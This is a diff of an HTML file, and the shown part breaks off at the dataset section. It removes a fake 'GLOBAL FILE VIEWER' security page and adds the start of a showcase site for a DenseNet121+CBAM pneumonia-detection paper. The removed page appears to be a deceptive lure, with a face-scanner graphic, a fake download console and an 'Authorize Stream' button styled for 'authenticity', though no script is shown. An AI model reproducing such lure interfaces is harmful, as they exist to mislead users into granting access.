@@ -1,274 +1,1707 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GLOBAL FILE VIEWER | ADVANCEED SEQURITY</title>
-    <style>
-        :root {
-            --primary: #00d4ff;
-            --accent: #00ff88;
-            --bg: #050a14;
-            --danger: #ff4b4b;
-            --dark-blue: #0a192f;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DenseNet121+CBAM | Pneumonia Detection Research | IEEE Access</title>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --sky: #e8f4fd;
+    --cloud: #f7fbff;
+    --glass: rgba(255,255,255,0.65);
+    --glass-border: rgba(255,255,255,0.9);
+    --glass-shadow: rgba(100,160,220,0.15);
+    --accent: #2563eb;
+    --accent2: #0ea5e9;
+    --accent3: #6366f1;
+    --gold: #f59e0b;
+    --red: #ef4444;
+    --green: #10b981;
+    --text: #0f172a;
+    --text-muted: #475569;
+    --text-light: #94a3b8;
+    --blob1: #bfdbfe;
+    --blob2: #e0e7ff;
+    --blob3: #bae6fd;
+  }
 
-        body { 
-            margin: 0; padding: 0; 
-            background: var(--bg); 
-            color: var(--primary); 
-            font-family: 'Courier New', Courier, monospace; 
-            display: flex; align-items: center; justify-content: center; 
-            height: 100vh; overflow: hidden; 
-        }
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
-        /* Top Loading Bar (Authenticity) */
-        #top-loader-container {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 5px;
-            background: rgba(0, 212, 255, 0.1);
-            z-index: 100;
-        }
-        #top-loader-fill {
-            height: 100%; width: 0%;
-            background: var(--accent);
-            box-shadow: 0 0 15px var(--accent);
-            transition: width 1.6s linear;
-        }
+  html { scroll-behavior: smooth; }
 
-        /* Scanline Effect */
-        body::before {
-            content: " ";
-            position: absolute; top: 0; left: 0; bottom: 0; right: 0;
-            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), 
-                        linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
-            z-index: 10; background-size: 100% 2px, 3px 100%; pointer-events: none;
-        }
+  body {
+    font-family: 'Inter', sans-serif;
+    background: #dbeafe;
+    color: var(--text);
+    min-height: 100vh;
+    overflow-x: hidden;
+    cursor: none;
+    line-height: 1.7;
+  }
 
-        .shield-container { 
-            border: 1px solid var(--primary); 
-            padding: 30px; 
-            background: rgba(10, 25, 47, 0.95); 
-            box-shadow: 0 0 30px rgba(0, 212, 255, 0.15); 
-            text-align: center; 
-            width: 90%; max-width: 550px;
-            position: relative;
-            z-index: 5;
-            border-radius: 4px;
-        }
+  /* ══════════════ CUSTOM CURSOR ══════════════ */
+  #cursor-dot {
+    position: fixed; top: 0; left: 0;
+    width: 12px; height: 12px;
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    border-radius: 50%;
+    pointer-events: none;
+    z-index: 9999;
+    transform: translate(-50%,-50%);
+    transition: transform 0.05s, width 0.2s, height 0.2s, background 0.2s;
+    mix-blend-mode: multiply;
+    box-shadow: 0 0 20px rgba(37,99,235,0.4);
+  }
+  #cursor-ring {
+    position: fixed; top: 0; left: 0;
+    width: 42px; height: 42px;
+    border: 2px solid rgba(37,99,235,0.5);
+    border-radius: 50%;
+    pointer-events: none;
+    z-index: 9998;
+    transform: translate(-50%,-50%);
+    transition: transform 0.15s cubic-bezier(.25,.46,.45,.94), width 0.3s, height 0.3s, border-color 0.3s;
+    backdrop-filter: blur(3px);
+  }
+  .cursor-grow #cursor-dot { width: 18px; height: 18px; background: linear-gradient(135deg, var(--accent2), var(--accent3)); }
+  .cursor-grow #cursor-ring { width: 60px; height: 60px; border-color: rgba(14,165,233,0.7); border-width: 3px; }
 
-        .scanner-frame {
-            position: relative;
-            width: 140px; height: 140px;
-            margin: 0 auto 20px;
-            border: 2px solid var(--primary);
-            background: rgba(0, 0, 0, 0.3);
-            display: flex; align-items: center; justify-content: center;
-        }
+  /* ══════════════ BACKGROUND LAYERS ══════════════ */
+  .bg-layer {
+    position: fixed; inset: 0;
+    background: linear-gradient(135deg, #e0f2fe 0%, #ede9fe 25%, #f0f9ff 50%, #e0e7ff 75%, #e8f5e9 100%);
+    z-index: -3;
+  }
+  .blob {
+    position: fixed;
+    border-radius: 50%;
+    filter: blur(90px);
+    opacity: 0.6;
+    animation: blobFloat 14s ease-in-out infinite alternate;
+    z-index: -2;
+  }
+  .blob1 { width: 650px; height: 650px; background: radial-gradient(circle, #bfdbfe, #93c5fd); top: -120px; left: -120px; animation-delay: 0s; }
+  .blob2 { width: 550px; height: 550px; background: radial-gradient(circle, #c7d2fe, #a5b4fc); top: 25%; right: -100px; animation-delay: -5s; }
+  .blob3 { width: 500px; height: 500px; background: radial-gradient(circle, #bae6fd, #7dd3fc); bottom: -100px; left: 25%; animation-delay: -10s; }
+  .blob4 { width: 400px; height: 400px; background: radial-gradient(circle, #a7f3d0, #6ee7b7); top: 50%; right: 15%; animation-delay: -7s; }
 
-        .scanner-line {
-            position: absolute;
-            width: 100%; height: 2px;
-            background: var(--accent);
-            box-shadow: 0 0 15px var(--accent);
-            animation: scan 3s linear infinite;
-            display: none;
-            z-index: 2;
-        }
+  @keyframes blobFloat {
+    0% { transform: translate(0,0) scale(1) rotate(0deg); }
+    50% { transform: translate(35px,-25px) scale(1.08) rotate(5deg); }
+    100% { transform: translate(-25px,35px) scale(0.95) rotate(-5deg); }
+  }
 
-        @keyframes scan {
-            0% { top: 0; }
-            100% { top: 100%; }
-        }
+  /* ══════════════ GRID OVERLAY ══════════════ */
+  .grid-overlay {
+    position: fixed; inset: 0; z-index: -1;
+    background-image:
+      linear-gradient(rgba(37,99,235,0.05) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(37,99,235,0.05) 1px, transparent 1px);
+    background-size: 50px 50px;
+  }
 
-        h1 { font-size: 1.4rem; letter-spacing: 5px; margin-bottom: 5px; text-transform: uppercase; text-shadow: 0 0 10px var(--primary); }
-        .subtitle { color: #5a7b8f; font-size: 11px; margin-bottom: 25px; letter-spacing: 1px; }
+  /* ══════════════ FLOATING PARTICLES ══════════════ */
+  .particle {
+    position: fixed;
+    border-radius: 50%;
+    pointer-events: none;
+    z-index: -1;
+    animation: particleDrift linear infinite;
+  }
+  @keyframes particleDrift {
+    from { transform: translateY(100vh) rotate(0deg); opacity: 0; }
+    10% { opacity: 0.8; }
+    90% { opacity: 0.8; }
+    to { transform: translateY(-100px) rotate(360deg); opacity: 0; }
+  }
 
-        /* Advanced Console */
-        #console {
-            background: rgba(0, 5, 10, 0.8);
-            border: 1px solid #1a3a4a;
-            height: 160px;
-            overflow-y: hidden;
-            text-align: left;
-            padding: 12px;
-            font-size: 11px;
-            margin-bottom: 20px;
-            color: var(--accent);
-            box-shadow: inset 0 0 10px #000;
-        }
+  /* ══════════════ NAVIGATION ══════════════ */
+  nav {
+    position: fixed; top: 0; left: 0; right: 0;
+    z-index: 100;
+    padding: 0 50px;
+    height: 75px;
+    display: flex; align-items: center; justify-content: space-between;
+    background: rgba(255,255,255,0.5);
+    backdrop-filter: blur(30px) saturate(180%);
+    border-bottom: 1px solid rgba(255,255,255,0.8);
+    box-shadow: 0 5px 40px rgba(100,160,220,0.12);
+  }
+  .nav-brand {
+    font-family: 'Syne', sans-serif;
+    font-weight: 800;
+    font-size: 1.2rem;
+    color: var(--accent);
+    letter-spacing: -0.03em;
+    display: flex; align-items: center; gap: 12px;
+    transition: transform 0.3s;
+  }
+  .nav-brand:hover { transform: scale(1.02); }
+  .nav-brand .dot { 
+    width: 10px; height: 10px; 
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    border-radius: 50%; 
+    display: inline-block; 
+    animation: pulse 2.5s infinite;
+    box-shadow: 0 0 15px rgba(37,99,235,0.6);
+  }
+  @keyframes pulse { 
+    0%,100%{transform:scale(1);opacity:1} 
+    50%{transform:scale(1.5);opacity:0.5} 
+  }
+  .nav-links { display: flex; gap: 10px; }
+  .nav-links a {
+    font-family: 'Inter', sans-serif;
+    font-size: 0.85rem;
+    font-weight: 500;
+    color: var(--text-muted);
+    text-decoration: none;
+    padding: 8px 16px;
+    border-radius: 24px;
+    transition: all 0.3s cubic-bezier(.25,.46,.45,.94);
+    letter-spacing: 0.01em;
+    position: relative;
+    overflow: hidden;
+  }
+  .nav-links a::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(135deg, rgba(37,99,235,0.1), rgba(99,102,241,0.08));
+    opacity: 0;
+    transition: opacity 0.3s;
+  }
+  .nav-links a:hover::before { opacity: 1; }
+  .nav-links a:hover { color: var(--accent); transform: translateY(-2px); }
+  .nav-badge {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.72rem;
+    background: linear-gradient(135deg, var(--accent), var(--accent3));
+    color: white;
+    padding: 6px 14px;
+    border-radius: 24px;
+    font-weight: 500;
+    box-shadow: 0 4px 16px rgba(37,99,235,0.3);
+    transition: transform 0.3s, box-shadow 0.3s;
+  }
+  .nav-badge:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(37,99,235,0.4); }
 
-        .btn { 
-            background: transparent; border: 1px solid var(--primary); 
-            color: var(--primary); padding: 14px 35px; 
-            font-size: 14px; font-weight: bold; cursor: pointer; 
-            text-transform: uppercase; transition: all 0.3s;
-            letter-spacing: 3px;
-            position: relative;
-        }
+  /* ══════════════ GLASS MORPHISM STYLES ══════════════ */
+  .glass {
+    background: rgba(255,255,255,0.65);
+    backdrop-filter: blur(25px) saturate(170%);
+    border: 1px solid rgba(255,255,255,0.9);
+    border-radius: 24px;
+    box-shadow: 0 10px 50px rgba(100,150,220,0.15), 0 1px 0 rgba(255,255,255,0.95) inset;
+    transition: transform 0.4s cubic-bezier(.25,.46,.45,.94), box-shadow 0.4s;
+  }
+  .glass:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 15px 60px rgba(100,150,220,0.2), 0 1px 0 rgba(255,255,255,0.95) inset;
+  }
+  .glass-dark {
+    background: rgba(255,255,255,0.4);
+    backdrop-filter: blur(20px) saturate(150%);
+    border: 1px solid rgba(255,255,255,0.7);
+    border-radius: 18px;
+    box-shadow: 0 6px 30px rgba(100,150,220,0.12);
+  }
 
-        .btn:hover { background: var(--primary); color: var(--bg); box-shadow: 0 0 25px var(--primary); }
+  /* ══════════════ LAYOUT ══════════════ */
+  main { padding-top: 75px; }
+  section { padding: 100px 50px; max-width: 1400px; margin: 0 auto; position: relative; }
 
-        .progress-container { width: 100%; background: #071221; height: 6px; margin-top: 15px; display: none; border: 1px solid #1a3a4a;}
-        .progress-bar { height: 100%; width: 0%; background: var(--primary); box-shadow: 0 0 10px var(--primary); transition: width 1.5s; }
+  /* ══════════════ HERO SECTION ══════════════ */
+  #hero {
+    min-height: calc(100vh - 75px);
+    display: flex; flex-direction: column; justify-content: center; align-items: center;
+    text-align: center;
+    position: relative;
+    padding: 100px 50px;
+  }
+  .hero-tag {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.75rem;
+    color: var(--accent);
+    text-transform: uppercase;
+    letter-spacing: 0.15em;
+    margin-bottom: 20px;
+    font-weight: 600;
+    animation: fadeInUp 0.6s ease-out;
+  }
+  .hero-title {
+    font-family: 'Syne', sans-serif;
+    font-weight: 800;
+    font-size: 4rem;
+    line-height: 1.15;
+    margin-bottom: 30px;
+    background: linear-gradient(135deg, var(--accent) 0%, var(--accent3) 50%, var(--accent2) 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    animation: fadeInUp 0.8s ease-out 0.1s backwards;
+  }
+  .hero-subtitle {
+    font-size: 1.3rem;
+    color: var(--text-muted);
+    max-width: 800px;
+    margin-bottom: 40px;
+    line-height: 1.8;
+    animation: fadeInUp 1s ease-out 0.2s backwards;
+  }
+  .hero-meta {
+    display: flex;
+    gap: 20px;
+    flex-wrap: wrap;
+    justify-content: center;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+    color: var(--text-light);
+    animation: fadeInUp 1.2s ease-out 0.3s backwards;
+  }
+  .hero-meta span {
+    padding: 8px 16px;
+    background: rgba(255,255,255,0.6);
+    border-radius: 20px;
+    border: 1px solid rgba(255,255,255,0.8);
+    backdrop-filter: blur(10px);
+  }
 
-        .network-grid {
-            display: flex; justify-content: space-between; margin-top: 10px; font-size: 9px; color: #4a6a7a;
-        }
+  @keyframes fadeInUp {
+    from { opacity: 0; transform: translateY(30px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
 
-        .glitch { animation: glitch 1.5s linear infinite; }
-        @keyframes glitch {
-            2%, 64% { transform: translate(2px,0) skew(0deg); }
-            4%, 60% { transform: translate(-2px,0) skew(0deg); }
-            62% { transform: translate(0,0) skew(5deg); }
-        }
-    </style>
+  /* ══════════════ SECTION STYLES ══════════════ */
+  .section-tag {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.7rem;
+    color: var(--accent);
+    text-transform: uppercase;
+    letter-spacing: 0.2em;
+    margin-bottom: 12px;
+    font-weight: 600;
+  }
+  .section-title {
+    font-family: 'Syne', sans-serif;
+    font-weight: 700;
+    font-size: 2.8rem;
+    line-height: 1.2;
+    margin-bottom: 20px;
+    color: var(--text);
+  }
+  .section-title span {
+    background: linear-gradient(135deg, var(--accent), var(--accent3));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+  .section-sub {
+    font-size: 1.1rem;
+    color: var(--text-muted);
+    max-width: 900px;
+    margin-bottom: 50px;
+    line-height: 1.8;
+  }
+
+  /* ══════════════ REVEAL ANIMATION ══════════════ */
+  .reveal {
+    opacity: 0;
+    transform: translateY(40px);
+    transition: opacity 0.8s cubic-bezier(.25,.46,.45,.94), transform 0.8s cubic-bezier(.25,.46,.45,.94);
+  }
+  .reveal.visible {
+    opacity: 1;
+    transform: translateY(0);
+  }
+
+  /* ══════════════ STATS GRID ══════════════ */
+  .stats-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+    gap: 24px;
+    margin-top: 50px;
+  }
+  .stat-card {
+    padding: 40px 32px;
+    text-align: center;
+    position: relative;
+    overflow: hidden;
+    transition: transform 0.3s;
+  }
+  .stat-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%;
+    height: 4px;
+    background: linear-gradient(90deg, var(--accent), var(--accent2), var(--accent3));
+  }
+  .stat-number {
+    font-family: 'Syne', sans-serif;
+    font-weight: 800;
+    font-size: 3rem;
+    background: linear-gradient(135deg, var(--accent), var(--accent3));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    margin-bottom: 12px;
+  }
+  .stat-label {
+    font-size: 0.85rem;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    font-weight: 600;
+  }
+  .stat-desc {
+    font-size: 0.9rem;
+    color: var(--text-light);
+    margin-top: 12px;
+    line-height: 1.6;
+  }
+
+  /* ══════════════ CONTENT GRID ══════════════ */
+  .content-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+    gap: 30px;
+    margin-top: 50px;
+  }
+  .content-box {
+    padding: 40px;
+  }
+  .content-box h3 {
+    font-family: 'Syne', sans-serif;
+    font-weight: 700;
+    font-size: 1.5rem;
+    margin-bottom: 20px;
+    color: var(--text);
+  }
+  .content-box p {
+    color: var(--text-muted);
+    line-height: 1.8;
+    margin-bottom: 16px;
+  }
+  .content-box ul {
+    list-style: none;
+    display: flex;
+    flex-direction: column;
+    gap: 14px;
+  }
+  .content-box ul li {
+    display: flex;
+    gap: 12px;
+    align-items: flex-start;
+    color: var(--text-muted);
+    line-height: 1.7;
+  }
+  .content-box ul li::before {
+    content: '▸';
+    color: var(--accent);
+    font-weight: 700;
+    flex-shrink: 0;
+  }
+
+  /* ══════════════ IMAGE SHOWCASE ══════════════ */
+  .image-showcase {
+    margin-top: 50px;
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+    gap: 30px;
+  }
+  .image-card {
+    padding: 20px;
+    border-radius: 20px;
+    overflow: hidden;
+  }
+  .image-card img {
+    width: 100%;
+    height: auto;
+    border-radius: 12px;
+    margin-bottom: 16px;
+    box-shadow: 0 8px 30px rgba(0,0,0,0.1);
+  }
+  .image-caption {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.75rem;
+    color: var(--text-light);
+    text-align: center;
+    margin-top: 12px;
+  }
+
+  /* ══════════════ ARCHITECTURE DIAGRAM ══════════════ */
+  .arch-container {
+    margin-top: 60px;
+    padding: 50px;
+    background: rgba(255,255,255,0.5);
+    border-radius: 24px;
+    border: 1px solid rgba(255,255,255,0.8);
+    backdrop-filter: blur(20px);
+  }
+  .arch-title {
+    font-family: 'Syne', sans-serif;
+    font-weight: 700;
+    font-size: 1.8rem;
+    text-align: center;
+    margin-bottom: 40px;
+    color: var(--text);
+  }
+  .arch-flow {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    gap: 20px;
+    flex-wrap: wrap;
+  }
+  .arch-block {
+    flex: 1;
+    min-width: 200px;
+    padding: 30px 24px;
+    background: rgba(255,255,255,0.7);
+    border: 2px solid rgba(37,99,235,0.2);
+    border-radius: 16px;
+    text-align: center;
+    position: relative;
+    transition: all 0.4s;
+  }
+  .arch-block:hover {
+    transform: translateY(-8px) scale(1.03);
+    border-color: var(--accent);
+    box-shadow: 0 15px 40px rgba(37,99,235,0.2);
+  }
+  .arch-block::after {
+    content: '→';
+    position: absolute;
+    right: -30px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 2rem;
+    color: var(--accent);
+    font-weight: 700;
+  }
+  .arch-block:last-child::after {
+    display: none;
+  }
+  .arch-label {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.7rem;
+    color: var(--accent);
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    margin-bottom: 10px;
+    font-weight: 600;
+  }
+  .arch-name {
+    font-family: 'Syne', sans-serif;
+    font-weight: 700;
+    font-size: 1.2rem;
+    color: var(--text);
+    margin-bottom: 8px;
+  }
+  .arch-desc {
+    font-size: 0.8rem;
+    color: var(--text-muted);
+    line-height: 1.5;
+  }
+
+  /* ══════════════ TABLE STYLES ══════════════ */
+  .table-container {
+    margin-top: 40px;
+    overflow-x: auto;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    background: rgba(255,255,255,0.6);
+    border-radius: 16px;
+    overflow: hidden;
+    backdrop-filter: blur(15px);
+  }
+  thead {
+    background: linear-gradient(135deg, rgba(37,99,235,0.1), rgba(99,102,241,0.08));
+  }
+  th {
+    padding: 20px;
+    text-align: left;
+    font-family: 'Syne', sans-serif;
+    font-weight: 700;
+    color: var(--accent);
+    font-size: 0.9rem;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+  }
+  td {
+    padding: 18px 20px;
+    border-bottom: 1px solid rgba(255,255,255,0.5);
+    color: var(--text-muted);
+    font-size: 0.9rem;
+  }
+  tr:hover {
+    background: rgba(37,99,235,0.04);
+  }
+  tbody tr:last-child td {
+    border-bottom: none;
+  }
+
+  /* ══════════════ METRIC BARS ══════════════ */
+  .metric-row {
+    margin-bottom: 24px;
+  }
+  .metric-label {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 10px;
+    font-weight: 600;
+    color: var(--text);
+  }
+  .metric-value {
+    font-family: 'JetBrains Mono', monospace;
+    color: var(--accent);
+    font-weight: 700;
+  }
+  .metric-bar {
+    height: 12px;
+    background: rgba(255,255,255,0.5);
+    border-radius: 10px;
+    overflow: hidden;
+    position: relative;
+  }
+  .metric-bar-fill {
+    height: 100%;
+    background: linear-gradient(90deg, var(--accent), var(--accent2));
+    border-radius: 10px;
+    animation: fillBar 2s ease-out forwards;
+    animation-play-state: paused;
+    box-shadow: 0 0 15px rgba(37,99,235,0.4);
+  }
+  @keyframes fillBar {
+    from { width: 0; }
+  }
+
+  /* ══════════════ CODE BLOCKS ══════════════ */
+  .code-block {
+    background: rgba(15,23,42,0.9);
+    color: #e2e8f0;
+    padding: 30px;
+    border-radius: 16px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.85rem;
+    line-height: 1.7;
+    overflow-x: auto;
+    margin-top: 30px;
+    border: 1px solid rgba(255,255,255,0.1);
+  }
+  .code-block .comment { color: #64748b; }
+  .code-block .keyword { color: #7dd3fc; font-weight: 600; }
+  .code-block .string { color: #86efac; }
+  .code-block .number { color: #fbbf24; }
+
+  /* ══════════════ TIMELINE ══════════════ */
+  .timeline {
+    position: relative;
+    padding-left: 50px;
+    margin-top: 50px;
+  }
+  .timeline::before {
+    content: '';
+    position: absolute;
+    left: 15px;
+    top: 0;
+    bottom: 0;
+    width: 3px;
+    background: linear-gradient(180deg, var(--accent), var(--accent2), var(--accent3));
+    border-radius: 2px;
+  }
+  .timeline-item {
+    position: relative;
+    margin-bottom: 50px;
+  }
+  .timeline-item::before {
+    content: '';
+    position: absolute;
+    left: -43px;
+    top: 8px;
+    width: 16px;
+    height: 16px;
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    border-radius: 50%;
+    border: 3px solid #dbeafe;
+    box-shadow: 0 0 20px rgba(37,99,235,0.5);
+  }
+  .timeline-title {
+    font-family: 'Syne', sans-serif;
+    font-weight: 700;
+    font-size: 1.3rem;
+    color: var(--text);
+    margin-bottom: 12px;
+  }
+  .timeline-content {
+    padding: 25px;
+    background: rgba(255,255,255,0.6);
+    border-radius: 16px;
+    border: 1px solid rgba(255,255,255,0.8);
+    backdrop-filter: blur(15px);
+  }
+  .timeline-content p {
+    color: var(--text-muted);
+    line-height: 1.7;
+    margin-bottom: 12px;
+  }
+  .timeline-content ul {
+    list-style: none;
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+  }
+  .timeline-content ul li {
+    display: flex;
+    gap: 10px;
+    color: var(--text-muted);
+    line-height: 1.6;
+  }
+  .timeline-content ul li::before {
+    content: '•';
+    color: var(--accent);
+    font-weight: 700;
+    font-size: 1.2rem;
+  }
+
+  /* ══════════════ HIGHLIGHT BOX ══════════════ */
+  .highlight-box {
+    padding: 30px;
+    background: linear-gradient(135deg, rgba(37,99,235,0.08), rgba(99,102,241,0.06));
+    border-radius: 18px;
+    border: 2px solid rgba(37,99,235,0.2);
+    margin-top: 30px;
+  }
+  .highlight-box h4 {
+    font-family: 'Syne', sans-serif;
+    font-weight: 700;
+    color: var(--accent);
+    margin-bottom: 16px;
+    font-size: 1.2rem;
+  }
+  .highlight-box p {
+    color: var(--text-muted);
+    line-height: 1.8;
+  }
+
+  /* ══════════════ FOOTER ══════════════ */
+  footer {
+    background: rgba(255,255,255,0.5);
+    backdrop-filter: blur(25px);
+    border-top: 1px solid rgba(255,255,255,0.8);
+    padding: 60px 50px 40px;
+    text-align: center;
+  }
+  .f-title {
+    font-family: 'Syne', sans-serif;
+    font-weight: 700;
+    font-size: 1.3rem;
+    color: var(--text);
+    margin-bottom: 12px;
+  }
+  .f-sub {
+    font-size: 1rem;
+    color: var(--text-muted);
+    margin-bottom: 25px;
+  }
+  .f-meta {
+    display: flex;
+    gap: 20px;
+    justify-content: center;
+    flex-wrap: wrap;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.7rem;
+    color: var(--text-light);
+  }
+  .f-meta span {
+    padding: 6px 14px;
+    background: rgba(255,255,255,0.6);
+    border-radius: 16px;
+    border: 1px solid rgba(255,255,255,0.7);
+  }
+
+  /* ══════════════ RESPONSIVE ══════════════ */
+  @media (max-width: 768px) {
+    nav { padding: 0 24px; height: 65px; }
+    .nav-links { display: none; }
+    section { padding: 60px 24px; }
+    .hero-title { font-size: 2.5rem; }
+    .hero-subtitle { font-size: 1.1rem; }
+    .section-title { font-size: 2rem; }
+    .stats-grid, .content-grid, .image-showcase { grid-template-columns: 1fr; }
+    .arch-flow { flex-direction: column; }
+    .arch-block::after { display: none; }
+  }
+</style>
 </head>
 <body>
-    <div id="top-loader-container"><div id="top-loader-fill"></div></div>
 
-    <div class="shield-container" id="main-ui">
-        <div class="scanner-frame">
-            <div id="scanLine" class="scanner-line"></div>
-            <div style="font-size: 70px; opacity: 0.8;">👤</div>
-        </div>
-        
-        <h1 id="title">GLOBAL FILES SHARE</h1>
-        <p class="subtitle">ENCRYPTED NODE: DOWNLOADING RESOURCES // ACCESS POINT 443</p>
+<!-- Custom Cursor -->
+<div id="cursor-dot"></div>
+<div id="cursor-ring"></div>
 
-        <div id="console">
-            > SYSTEM STATUS: IDLE<br>
-            > LOG: AWAITING DOWNLOAD SIGNAL...
-        </div>
+<!-- Background Layers -->
+<div class="bg-layer"></div>
+<div class="blob blob1"></div>
+<div class="blob blob2"></div>
+<div class="blob blob3"></div>
+<div class="blob blob4"></div>
+<div class="grid-overlay"></div>
 
-        <button class="btn" id="mainBtn" onclick="initiate()">Authorize Stream</button>
+<!-- Navigation -->
+<nav>
+  <div class="nav-brand">
+    <span class="dot"></span>
+    DenseNet121+CBAM
+  </div>
+  <div class="nav-links">
+    <a href="#introduction">Introduction</a>
+    <a href="#dataset">Dataset</a>
+    <a href="#architecture">Architecture</a>
+    <a href="#training">Training</a>
+    <a href="#results">Results</a>
+    <a href="#explainability">Explainability</a>
+    <a href="#conclusion">Conclusion</a>
+  </div>
+  <div class="nav-badge">IEEE ACCESS</div>
+</nav>
 
-        <div class="progress-container" id="progCont">
-            <div id="loader" class="progress-bar"></div>
-        </div>
-        
-        <div class="network-grid" id="netGrid" style="display:none;">
-            <span>TX_STABILITY: 99.4%</span>
-            <span>UPLINK_ACTIVE</span>
-            <span>NODE_LATENCY: 24ms</span>
-        </div>
+<main>
+
+<!-- ════════════════════════ HERO SECTION ════════════════════════ -->
+<section id="hero">
+  <div class="hero-tag">Advanced Medical Imaging · Deep Learning Research</div>
+  <h1 class="hero-title">An Explainable DenseNet121 Framework with CBAM Attention for Pneumonia Detection</h1>
+  <p class="hero-subtitle">A comprehensive deep learning approach combining convolutional block attention mechanisms with focal loss optimization for enhanced diagnostic accuracy in pediatric chest X-ray analysis</p>
+  <div class="hero-meta">
+    <span>Khirabdi Tanaya Patri</span>
+    <span>Bhubesh A K</span>
+    <span>Abhishek N Tripathi</span>
+    <span>VIT Vellore · SEE</span>
+    <span>PyTorch 2.2.0</span>
+  </div>
+</section>
+
+<!-- ════════════════════════ INTRODUCTION ════════════════════════ -->
+<section id="introduction">
+  <div class="section-tag">01 · Introduction & Motivation</div>
+  <h2 class="section-title">Problem <span>Statement</span></h2>
+  <p class="section-sub">Pneumonia remains a leading cause of mortality in children under five, accounting for approximately 15% of pediatric deaths globally. Early and accurate diagnosis through chest X-ray analysis is critical for effective treatment.</p>
+
+  <div class="stats-grid reveal">
+    <div class="glass stat-card">
+      <div class="stat-number">5,856</div>
+      <div class="stat-label">Total Images</div>
+      <div class="stat-desc">Chest X-Ray Dataset (Kaggle)</div>
+    </div>
+    <div class="glass stat-card">
+      <div class="stat-number">1-5</div>
+      <div class="stat-label">Age Range</div>
+      <div class="stat-desc">Pediatric Patients (Years)</div>
+    </div>
+    <div class="glass stat-card">
+      <div class="stat-number">8M</div>
+      <div class="stat-label">Parameters</div>
+      <div class="stat-desc">31% of ResNet50 Size</div>
+    </div>
+    <div class="glass stat-card">
+      <div class="stat-number">96.2%</div>
+      <div class="stat-label">Sensitivity</div>
+      <div class="stat-desc">Clinical-Grade Detection</div>
+    </div>
+  </div>
+
+  <div class="content-grid reveal">
+    <div class="glass content-box">
+      <h3>Research Objectives</h3>
+      <ul>
+        <li>Develop a lightweight, explainable deep learning model for binary pneumonia classification</li>
+        <li>Address severe class imbalance (pneumonia:normal ratio of 3:1) through dual-level strategies</li>
+        <li>Optimize for high sensitivity to minimize false negatives in clinical settings</li>
+        <li>Provide spatial interpretability through Grad-CAM visualizations</li>
+        <li>Achieve superior performance with fewer parameters than baseline architectures</li>
+      </ul>
+    </div>
+    <div class="glass content-box">
+      <h3>Key Challenges</h3>
+      <ul>
+        <li>Class imbalance leading to model bias toward majority class (pneumonia)</li>
+        <li>Limited dataset from single institution restricting generalizability</li>
+        <li>High false positive cost in clinical decision-making</li>
+        <li>Need for spatial explainability beyond scalar predictions</li>
+        <li>Computational constraints requiring parameter-efficient architectures</li>
+        <li>Preserving pre-trained features while adapting to medical domain</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="image-showcase reveal">
+    <div class="glass image-card">
+      <img src="https://production-media.paperswithcode.com/datasets/ChestXray2017-0000000415-06e4f89d_zA4eU8S.jpg" alt="Chest X-Ray Normal vs Pneumonia">
+      <div class="image-caption">Figure 1: Representative chest X-ray images showing normal (left) and pneumonia-positive (right) cases from the pediatric dataset</div>
+    </div>
+    <div class="glass image-card">
+      <img src="https://miro.medium.com/v2/resize:fit:1400/1*xBvbF7BDOKx0YBs_PpCqyg.png" alt="Pneumonia Statistics">
+      <div class="image-caption">Figure 2: Global pneumonia burden in children under 5 years, highlighting the critical need for automated diagnostic tools</div>
+    </div>
+  </div>
+</section>
+
+<!-- ════════════════════════ DATASET ════════════════════════ -->
+<section id="dataset">
+  <div class="section-tag">02 · Dataset & Preprocessing</div>
+  <h2 class="section-title">Data <span>Pipeline</span></h2>
